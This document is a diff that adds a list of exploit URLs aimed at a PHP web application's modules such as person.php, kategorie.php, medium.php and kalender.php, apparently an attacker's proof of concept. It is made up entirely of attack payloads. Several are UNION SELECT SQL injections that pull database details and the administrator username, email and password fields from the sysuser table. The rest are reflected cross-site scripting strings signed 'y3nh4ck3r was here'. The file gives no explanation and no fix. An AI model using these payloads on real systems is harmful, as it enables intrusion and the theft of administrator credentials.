@@ -1,0 +1,15 @@
+http://www.example.com/[HOME_PATH]/modules/person.php?Modus=Detail&amp;ID=2+AND+0+UNION+ALL+SELECT+1,2,3,4,version(),6,user(),version(),database(),10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36/*
+
+http://www.example.com/[HOME_PATH]/modules/schlagwort.php?Modus=Detail&amp;ID=1+AND+0+UNION+ALL+SELECT+1,version(),database(),current_user(),user(),6/*
+
+http://www.example.com/[HOME_PATH]/modules/kategorie.php?Modus=Detail&amp;ID=1+and+0+union+all+select+1,SuUser,SuEmail,SuPwd,SuSysAut+FROM+sysuser+WHERE+SuID=1%23
+
+http://www.example.com/[HOME_PATH]/modules/medium.php?Modus=Detail&amp;ID=23+and+0+UNION+ALL+SELECT+1,2,3,4,SuUser,SuPwd,6+FROM+sysuser+WHERE+SuID=1/*
+
+http://www.example.com/[HOME_PATH]/modules/kalender.php?month=5&amp;year=2009&quot;&gt;&lt;script&gt;alert(&#039;y3nh4ck3r+was+here!&#039;)&lt;/script&gt;
+
+http://www.example.com/[HOME_PATH]/modules/ereignis.php?Modus=List&amp;Page=1&quot;&gt;&lt;script&gt;alert(&#039;y3nh4ck3r+was+here!&#039;)&lt;/script&gt;&amp;Order=ErAnfangsdatum
+
+http://www.example.com/[HOME_PATH]/modules/kategorie.php?Modus=Search&amp;Kontext=objekt&quot;&gt;&lt;script&gt;alert(&#039;y3nh4ck3r+was+here!&#039;)&lt;/script&gt;
+
+http://www.example.com/[HOME_PATH]/modules/image.php?image=&lt;script&gt;alert(&#039;y3nh4ck3r+was+here!&#039;)&lt;/script&gt;
